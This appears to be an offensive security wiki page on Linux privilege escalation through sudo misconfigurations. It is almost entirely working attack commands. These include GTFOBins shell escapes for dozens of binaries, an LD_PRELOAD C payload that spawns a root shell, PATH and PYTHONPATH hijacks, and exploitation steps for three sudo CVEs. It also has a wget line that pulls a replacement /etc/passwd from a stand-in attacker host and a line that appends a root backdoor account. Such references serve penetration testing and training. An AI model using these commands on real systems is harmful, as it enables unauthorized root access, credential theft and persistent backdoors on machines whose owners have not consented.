---
title: 'Sudo Rights Abuse'
description: 'Linux privilege escalation via sudo misconfigurations — GTFOBins sudo exploits, env_keep abuse, sudoers wildcards, sudo CVEs, and comprehensive command reference.'
---

# Sudo Rights Abuse

`sudo -l` is the **first command** you should run on any Linux target. Misconfigured sudo rights are the most common and reliable privilege escalation vector.

---

## Quick Reference — Reading `sudo -l` Output

```
User user may run the following commands on host:
    (root) NOPASSWD: /usr/bin/vim
     │       │          │
     │       │          └─ Command allowed (check GTFOBins!)
     │       └─ No password needed (instant exploit)
     └─ Runs as root
```

### Key Things to Look For

| Pattern | Meaning | Exploitability |
|:--------|:--------|:--------------|
| `(root) NOPASSWD: /usr/bin/binary` | Run as root, no password | ⭐ Check GTFOBins immediately |
| `(root) /usr/bin/binary` | Run as root, needs YOUR password | Exploitable if you know the password |
| `(ALL) NOPASSWD: ALL` | Full root access | `sudo su` or `sudo bash` → root |
| `(ALL:ALL) ALL` | Full root access (needs password) | `sudo su` if you have the password |
| `(user2) NOPASSWD: /bin/bash` | Run bash as user2 | `sudo -u user2 /bin/bash` |
| `!root` | Cannot run as root | Try `sudo -u#-1` (CVE-2019-14287) |
| `env_keep += LD_PRELOAD` | LD_PRELOAD preserved | Shared library injection → root |
| `env_keep += LD_LIBRARY_PATH` | Library path preserved | Library hijacking → root |
| `NOPASSWD: /path/to/script.sh` | Script runs as root | Check if script is writable or has relative paths |
| `NOPASSWD: /usr/bin/binary *` | Wildcard in arguments | Can pass any arguments |

---

## 1. Enumeration

```bash
# Check sudo privileges (ALWAYS run this first)
sudo -l

# If password required, try common/found passwords
# Also try empty password:
echo "" | sudo -S -l 2>/dev/null

# Check sudo version for CVEs
sudo -V | head -1

# Check sudoers file (if readable)
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null
```

---

## 2. GTFOBins — Sudo Exploitation

[GTFOBins Sudo Filter](https://gtfobins.github.io/#+sudo) — always cross-reference every sudo-allowed binary.

### Most Common Sudo Exploits

| Binary | Exploit Command |
|:-------|:---------------|
| `vim` / `vi` | `sudo vim -c ':!bash'` |
| `nano` | `sudo nano` → `Ctrl+R` → `Ctrl+X` → `bash` |
| `less` | `sudo less /etc/shadow` → `!bash` |
| `more` | `sudo more /etc/shadow` → `!bash` |
| `man` | `sudo man ls` → `!bash` |
| `find` | `sudo find / -exec /bin/bash \; -quit` |
| `awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| `python` | `sudo python -c 'import os; os.system("/bin/bash")'` |
| `perl` | `sudo perl -e 'exec "/bin/bash";'` |
| `ruby` | `sudo ruby -e 'exec "/bin/bash"'` |
| `lua` | `sudo lua -e 'os.execute("/bin/bash")'` |
| `env` | `sudo env /bin/bash` |
| `ftp` | `sudo ftp` → `!bash` |
| `nmap` | `sudo nmap --interactive` → `!sh` (old versions) |
| `git` | `sudo git -p help config` → `!bash` |
| `zip` | `sudo zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"` |
| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |
| `cp` | Overwrite `/etc/passwd` or `/etc/shadow` |
| `wget` | Download modified `/etc/passwd` → `sudo wget -O /etc/passwd http://ATTACKER/passwd` |
| `tee` | `echo "hacker:HASH:0:0::/root:/bin/bash" \| sudo tee -a /etc/passwd` |
| `tcpdump` | `sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/shell.sh -Z root` |
| `apache2` | `sudo apache2 -f /etc/shadow` (reads file in error output) |
| `mysql` | `sudo mysql -e '\! bash'` |
| `ssh` | `sudo ssh -o ProxyCommand='bash -c "bash -i"' x` |
| `systemctl` | `sudo systemctl` → `!bash` (through pager) |
| `journalctl` | `sudo journalctl` → `!bash` (through pager) |
| `apt-get` | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash` |
| `dpkg` | `sudo dpkg -l` → `!bash` (through pager) |
| `screen` | `sudo screen` → spawns root shell |

!!! tip "Pager-Based Exploits"
    Many commands (`less`, `more`, `man`, `git`, `systemctl`, `journalctl`, `dpkg`) open output in a **pager**. If the output is long enough to trigger paging, type `!bash` to escape to a root shell. If the terminal is too wide, shrink it first so the output wraps.

---

## 3. Sudo with Scripts

If sudo allows running a **script** as root, check for these attack vectors:

### Writable Script

```bash
# Check if you can write to the script
ls -la /path/to/allowed_script.sh

# If writable, inject a reverse shell or escalation command
echo '/bin/bash' >> /path/to/allowed_script.sh

# Or replace it entirely
echo '#!/bin/bash' > /path/to/allowed_script.sh
echo '/bin/bash' >> /path/to/allowed_script.sh

# Run via sudo
sudo /path/to/allowed_script.sh
```

### Script Uses Relative Paths

```bash
# If the script calls commands without full paths (e.g., "tar" instead of "/bin/tar"):
# See the PATH Abuse page for full exploitation details

# Quick version:
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash' >> /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
sudo /path/to/allowed_script.sh
```

!!! warning "secure_path"
    Most sudo configs define `secure_path` which overrides your PATH. Check `sudo -l` output for `secure_path`. If present, PATH injection via environment won't work — you need to modify the script itself or find another vector.

### Script Uses Wildcards

If the script uses `*` with tar, rsync, etc., see the [Wildcard Abuse](wildcard-abuse.md) page.

---

## 4. Environment Variable Abuse

### LD_PRELOAD

If `sudo -l` shows `env_keep += LD_PRELOAD`:

```c
// shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

```bash
# Compile
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c

# Run ANY allowed sudo command with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/allowed_command
# → root shell (regardless of what allowed_command is)
```

!!! tip "LD_PRELOAD Works with ANY Command"
    The beauty of LD_PRELOAD is it doesn't matter what command sudo allows you to run. Even `sudo LD_PRELOAD=/tmp/shell.so /usr/bin/id` gives you root.

### LD_LIBRARY_PATH

If `sudo -l` shows `env_keep += LD_LIBRARY_PATH`:

```bash
# 1. Find shared libraries used by the allowed command
ldd /usr/bin/allowed_command

# 2. Create malicious version of one (use same shell.c as above)
gcc -fPIC -shared -nostartfiles -o /tmp/libcrypt.so.1 shell.c

# 3. Run with hijacked library path
sudo LD_LIBRARY_PATH=/tmp /usr/bin/allowed_command
```

### PYTHONPATH / PERL5LIB / Other Language Paths

If `env_keep` includes language-specific path variables:

```bash
# PYTHONPATH — if sudo runs a Python script
mkdir /tmp/fakepython
echo 'import os; os.system("/bin/bash")' > /tmp/fakepython/module_imported_by_script.py
sudo PYTHONPATH=/tmp/fakepython /usr/bin/python3 /path/to/script.py
```

---

## 5. Sudo CVEs

### CVE-2019-14287 — User ID -1 Bypass

**Affected**: sudo < 1.8.28

If `sudo -l` shows `!root` (cannot run as root):

```bash
# The entry looks like:
# (ALL, !root) /bin/bash

# Bypass with UID -1 (wraps to 0 = root)
sudo -u#-1 /bin/bash
# → root shell!
```

### CVE-2021-3156 — Baron Samedit (Heap Overflow)

**Affected**: sudo 1.8.2 – 1.8.31p2, 1.9.0 – 1.9.5p1

```bash
# Check version
sudo -V | head -1

# Quick vulnerability test (segfault = likely vulnerable)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# Exploit repos:
# https://github.com/blasty/CVE-2021-3156
# https://github.com/worawit/CVE-2021-3156
```

!!! warning "Baron Samedit"
    This is a **critical** exploit — no sudo access needed, just the `sudoedit` binary. If the version is in range, this should be your first attempt.

### CVE-2023-22809 — Sudoedit Bypass

**Affected**: sudo 1.8.0 – 1.9.12p1

Allows editing arbitrary files through `sudoedit` when `EDITOR` environment variable contains `--` separator:

```bash
# If sudoedit is allowed for specific files:
# (root) sudoedit /etc/custom.conf

# Bypass to edit /etc/shadow instead:
EDITOR="vim -- /etc/shadow" sudoedit /etc/custom.conf
```

### Sudo Version Quick Reference

| CVE | Versions | Requires Sudo Access? | Severity |
|:----|:---------|:---------------------|:---------|
| CVE-2019-14287 | < 1.8.28 | Yes (with `!root`) | High |
| CVE-2021-3156 | 1.8.2 – 1.8.31p2, 1.9.0 – 1.9.5p1 | No | Critical |
| CVE-2023-22809 | 1.8.0 – 1.9.12p1 | Yes (sudoedit) | High |

---

## 6. Sudo Token Reuse

If another user has recently used `sudo` and the `timestamp_timeout` hasn't expired (default 15 minutes), you may be able to reuse their token.

```bash
# Check if sudo tokens exist
ls -la /var/run/sudo/ts/
ls -la /var/lib/sudo/ts/
# or
ls -la /run/sudo/ts/

# If a token file exists for a user and you can access their session,
# sudo commands may not require a password
```

---

## 7. Sudo with `NOEXEC` and Restrictions

Some sudo entries include restrictions. Know what blocks you:

| Restriction | Effect | Bypass? |
|:------------|:-------|:--------|
| `NOEXEC:` | Prevents executed program from running other programs | Hard to bypass, limits shell escapes |
| `NOPASSWD:` | No password required | Makes exploitation easier |
| `SETENV:` | Allows setting environment variables | Enables LD_PRELOAD/PATH attacks |
| `!SETENV:` | Prevents setting environment variables | Blocks LD_PRELOAD attacks |
| `secure_path=` | Overrides PATH for sudo | Blocks PATH injection |
| `env_reset` | Clears environment variables | Blocks most env attacks |

---

## Cheatsheet — Sudo Escalation in 30 Seconds

```bash
# 1. Check sudo permissions
sudo -l

# 2. If you see a binary → check GTFOBins
# https://gtfobins.github.io/#+sudo

# 3. Quick wins:
sudo su                                    # If (ALL) ALL
sudo bash                                  # If (ALL) ALL
sudo vim -c ':!bash'                       # If vim allowed
sudo find / -exec /bin/bash \; -quit       # If find allowed
sudo python -c 'import os;os.system("bash")'  # If python allowed
sudo env /bin/bash                         # If env allowed

# 4. LD_PRELOAD (if env_keep includes it):
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_cmd

# 5. Sudo CVE (check version first):
sudo -V | head -1
sudo -u#-1 /bin/bash                       # CVE-2019-14287
sudoedit -s '\' $(python3 -c 'print("A"*1000)')  # CVE-2021-3156 test
```